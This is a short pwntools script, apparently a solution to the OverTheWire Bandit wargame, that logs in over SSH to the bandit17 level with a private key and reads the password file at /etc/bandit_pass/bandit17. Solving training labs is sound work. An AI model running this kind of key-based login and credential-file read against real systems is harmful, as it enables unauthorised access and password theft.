#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit0 exploit by SKane')

shell = ssh('bandit17', 'bandit.labs.overthewire.org', keyfile='../sshkey/sshkey2.private', port=2220)

sh = shell.run('sh')

sh.sendline('cat /etc/bandit_pass/bandit17')

log.success("Password for bandit17: " + sh.recvline())
